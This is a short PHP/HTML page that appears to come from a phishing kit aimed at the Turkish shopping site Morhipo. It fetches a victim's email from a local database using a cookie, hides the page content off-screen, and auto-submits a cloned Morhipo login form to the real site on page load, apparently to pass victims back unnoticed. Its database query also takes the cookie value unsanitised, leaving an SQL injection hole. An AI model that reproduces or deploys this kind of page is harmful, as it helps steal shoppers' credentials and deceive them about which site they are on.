<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `morhipo` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["loginpage"].submit();}</script>



<form action="http://www.morhipo.com/giris" id="loginpage" method="post" novalidate="novalidate"><input id="LoginTypeGuidKey" name="LoginTypeGuidKey" type="hidden" value="">
        <div class="login-description">Bilgilerinizi girerek ayrıcalıklardan faydalanabilirsiniz.</div>
        <div class="login-box-title">E-Posta :</div>
        <div class="login-box">
            <input data-val="true" data-val-required="* Lütfen e-posta adresinizi giriniz." id="Username" maxlength="150" name="Username" type="text" value="<?=$email;?>">
            
        </div>
        <div class="login-box-title">Şifre :</div>
        <div class="login-box" onKeyUp="javascript:$core.handleEnter(event, mainLoginFunc);">
            <input autocomplete="off" data-val="true" data-val-required="* Lütfen şifrenizi giriniz" id="Password" maxlength="20" name="Password" type="password">
        </div>
        
        <div class="login-remeberme">
            Beni Hatırla&nbsp;&nbsp;<input data-val="true" data-val-required="The RememberMe field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true"><input name="RememberMe" type="hidden" value="false">
            <input id="ReturnUrl" name="ReturnUrl" type="hidden" value="/">                            
        </div>
        <div class="login-button">
            <a class="login" rel="Login.Gris" href="javascript:;" onClick=" document.forms['loginpage'].submit();" title="Morhipo Alışveriş Giriş Yap">Giriş</a>
        </div>
        <div class="login-signup-forgetpass">
            <div class="login-signup">
                <a class="signup" href="/uyeol" title="Morhipo Üye Ol">Üye Ol</a>
            </div>
            <div class="login-forgotpass">
                <a class="forgot" href="/sifremi-unuttum" title="Şifremi Unuttum">Şifremi Unuttum</a>
            </div>       
        </div>
        </form>
        
        
        

</body>
</html>

